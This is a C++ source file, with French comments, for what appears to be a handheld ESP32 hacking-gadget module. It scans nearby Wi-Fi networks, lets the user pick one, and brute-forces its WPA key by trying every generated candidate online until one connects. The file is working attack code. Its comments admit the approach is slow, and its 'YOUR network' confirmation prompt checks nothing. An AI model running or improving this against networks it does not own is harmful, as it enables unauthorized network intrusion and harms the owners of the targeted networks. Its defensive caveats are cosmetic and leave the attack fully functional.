// ---------------------------------------------------------------------------
//  bruteforce.cpp — génération incrémentale de combinaisons (brute-force WPA).
//
//  Réimplémentation clean-room. La génération est un odomètre sur un jeu de
//  caractères : instantanée. Le facteur limitant est l'essai WPA en ligne
//  (~4 s). Le module affiche l'ETA en direct pour que la réalité soit visible :
//  au-delà d'un tout petit espace, c'est une démonstration, pas un crack.
//
//  Flux : choisir la cible -> régler jeu/longueur -> gate -> défilement.
// ---------------------------------------------------------------------------
#include "config.h"
#include "theme.h"
#include "authgate.h"
#include "bruteforce.h"
#include "wifitry.h"
#include <math.h>

namespace BruteForce {

// Jeux de caractères proposés.
struct Charset { const char *name; const char *chars; };
static const Charset CHARSETS[] = {
    {"digits",      "0123456789"},
    {"lower",       "abcdefghijklmnopqrstuvwxyz"},
    {"lower+dig",   "abcdefghijklmnopqrstuvwxyz0123456789"},
    {"alnum",       "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"},
};
static const int CHARSET_COUNT = sizeof(CHARSETS) / sizeof(CHARSETS[0]);

static const int LEN_MIN = 8, LEN_MAX = 12;   // WPA impose >= 8
static const double SEC_PER_TRY = 4.0;        // ordre de grandeur d'un essai WPA

enum State { PICK, CONFIG, RUNNING, DONE };
static State state = PICK;

static int netCount = 0, sel = 0, top = 0;
static const int ROWS = 5;

static int csIdx = 0;      // jeu de caractères choisi
static int length = 8;     // longueur des combinaisons

static String targetSsid;
static bool targetOpen = false;

static uint8_t pos[LEN_MAX];       // odomètre : indice de chaque position
static char candidate[LEN_MAX + 1];
static unsigned long long tried = 0;
static bool found = false;
static String foundKey;

static unsigned long lastPress = 0;
static const unsigned long debounce = 200;

// --- Odomètre ---------------------------------------------------------------
static void resetOdometer() {
    for (int i = 0; i < length; i++) pos[i] = 0;
    tried = 0;
    found = false;
    foundKey = "";
}

static void buildCandidate() {
    const char *cs = CHARSETS[csIdx].chars;
    for (int i = 0; i < length; i++) candidate[i] = cs[pos[i]];
    candidate[length] = '\0';
}

// Incrémente l'odomètre. Renvoie false quand l'espace est épuisé (débordement).
static bool advance() {
    int base = strlen(CHARSETS[csIdx].chars);
    for (int i = length - 1; i >= 0; i--) {
        if (++pos[i] < base) return true;
        pos[i] = 0;
    }
    return false;
}

static double keyspace() {
    return pow((double)strlen(CHARSETS[csIdx].chars), (double)length);
}

// Format compact d'une durée en secondes.
static String humanTime(double s) {
    if (s < 90) return String((int)s) + "s";
    if (s < 5400) return String((int)(s / 60)) + "m";
    if (s < 172800) return String((int)(s / 3600)) + "h";
    double days = s / 86400.0;
    if (days < 365) return String((int)days) + "d";
    double years = days / 365.0;
    if (years < 1e6) return String((long)years) + "y";
    return ">1M y";
}

// --- Affichages -------------------------------------------------------------
static void drawPick() {
    u8g2.clearBuffer();
    gbHeader("Brute Force");
    u8g2.setFont(u8g2_font_5x8_tr);
    if (netCount == 0) {
        u8g2.drawStr(10, 30, "No networks.");
    } else {
        for (int i = 0; i < ROWS; i++) {
            int idx = top + i;
            if (idx >= netCount) break;
            int y = 22 + i * 8;
            if (idx == sel) u8g2.drawStr(0, y, ">");
            String ssid = WiFi.SSID(idx).substring(0, 16);
            u8g2.drawStr(8, y, ssid.c_str());
            if (WiFi.encryptionType(idx) == WIFI_AUTH_OPEN) u8g2.drawStr(104, y, "open");
        }
    }
    u8g2.drawStr(0, 63, "U/D  RIGHT pick  LEFT");
    u8g2.sendBuffer();
    setNeoPixelColour("scan");
}

static void drawConfig() {
    u8g2.clearBuffer();
    gbHeader("Brute Force");
    u8g2.setFont(u8g2_font_5x8_tr);
    String t = "Target: " + targetSsid.substring(0, 14);
    u8g2.drawStr(0, 24, t.c_str());
    char buf[28];
    snprintf(buf, sizeof(buf), "Charset: %s", CHARSETS[csIdx].name);
    u8g2.drawStr(0, 34, buf);
    snprintf(buf, sizeof(buf), "Length : %d", length);
    u8g2.drawStr(0, 42, buf);
    // ETA plein espace, pour montrer la réalité avant de lancer.
    String eta = "Full space ~" + humanTime(keyspace() * SEC_PER_TRY);
    u8g2.drawStr(0, 52, eta.c_str());
    u8g2.drawStr(0, 63, "UP set  DN len  RIGHT go");
    u8g2.sendBuffer();
    setNeoPixelColour("scan");
}

static void drawRunning() {
    u8g2.clearBuffer();
    gbHeader("Brute Force");
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(0, 26, candidate);
    u8g2.setFont(u8g2_font_5x8_tr);
    char buf[28];
    snprintf(buf, sizeof(buf), "Tried: %llu", tried);
    u8g2.drawStr(0, 38, buf);
    double remaining = keyspace() - (double)tried;
    if (remaining < 0) remaining = 0;
    String eta = "ETA ~" + humanTime(remaining * SEC_PER_TRY);
    u8g2.drawStr(0, 48, eta.c_str());
    u8g2.drawStr(0, 63, "LEFT: stop");
    u8g2.sendBuffer();
    setNeoPixelColour("attack");
}

static void drawDone() {
    u8g2.clearBuffer();
    gbHeader("Brute Force");
    u8g2.setFont(u8g2_font_6x10_tr);
    if (found) {
        u8g2.drawStr(0, 28, "KEY FOUND:");
        u8g2.drawStr(0, 42, foundKey.c_str());
        setNeoPixelColour("attack");
    } else {
        u8g2.drawStr(0, 28, "Stopped.");
        setNeoPixelColour("ok");
    }
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 63, "LEFT: back");
    u8g2.sendBuffer();
}

// --- Cycle de vie -----------------------------------------------------------
void setup() {
    state = PICK;
    sel = top = 0;
    csIdx = 0;
    length = 8;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    netCount = WiFi.scanNetworks();
    drawPick();
}

bool loop() {
    unsigned long now = millis();

    if (state == RUNNING) {
        buildCandidate();
        drawRunning();
        if (WifiTry::attempt(targetSsid.c_str(), candidate)) {
            found = true;
            foundKey = candidate;
        }
        tried++;
        bool more = advance();
        if (found || !more || digitalRead(BTN_PIN_LEFT) == LOW) {
            if (digitalRead(BTN_PIN_LEFT) == LOW) while (digitalRead(BTN_PIN_LEFT) == LOW);
            WiFi.disconnect(true, true);
            state = DONE;
            drawDone();
        }
        return false;
    }

    if (state == DONE) {
        if (digitalRead(BTN_PIN_LEFT) == LOW) {
            while (digitalRead(BTN_PIN_LEFT) == LOW);
            WiFi.mode(WIFI_OFF);
            setNeoPixelColour("0");
            return true;
        }
        return false;
    }

    if (now - lastPress < debounce) return false;

    if (state == PICK) {
        if (digitalRead(BUTTON_UP_PIN) == LOW) {
            lastPress = now;
            if (sel > 0) { sel--; if (sel < top) top = sel; }
            drawPick();
            while (digitalRead(BUTTON_UP_PIN) == LOW);
        } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
            lastPress = now;
            if (sel < netCount - 1) { sel++; if (sel >= top + ROWS) top = sel - ROWS + 1; }
            drawPick();
            while (digitalRead(BUTTON_DOWN_PIN) == LOW);
        } else if (digitalRead(BTN_PIN_RIGHT) == LOW && netCount > 0) {
            lastPress = now;
            while (digitalRead(BTN_PIN_RIGHT) == LOW);
            targetSsid = WiFi.SSID(sel);
            targetOpen = (WiFi.encryptionType(sel) == WIFI_AUTH_OPEN);
            if (targetOpen) { found = false; state = DONE; drawDone(); return false; }
            state = CONFIG;
            drawConfig();
        } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
            lastPress = now;
            while (digitalRead(BTN_PIN_LEFT) == LOW);
            WiFi.mode(WIFI_OFF);
            setNeoPixelColour("0");
            return true;
        }
        return false;
    }

    // state == CONFIG
    if (digitalRead(BUTTON_UP_PIN) == LOW) {
        lastPress = now;
        csIdx = (csIdx + 1) % CHARSET_COUNT;
        drawConfig();
        while (digitalRead(BUTTON_UP_PIN) == LOW);
    } else if (digitalRead(BUTTON_DOWN_PIN) == LOW) {
        lastPress = now;
        length = (length >= LEN_MAX) ? LEN_MIN : length + 1;
        drawConfig();
        while (digitalRead(BUTTON_DOWN_PIN) == LOW);
    } else if (digitalRead(BTN_PIN_RIGHT) == LOW) {
        lastPress = now;
        while (digitalRead(BTN_PIN_RIGHT) == LOW);
        if (AuthGate::confirm("Brute Force", "Tries generated keys", "on YOUR network.")) {
            resetOdometer();
            state = RUNNING;
        } else {
            drawConfig();
        }
    } else if (digitalRead(BTN_PIN_LEFT) == LOW) {
        lastPress = now;
        while (digitalRead(BTN_PIN_LEFT) == LOW);
        state = PICK;
        drawPick();
    }
    return false;
}

}  // namespace BruteForce
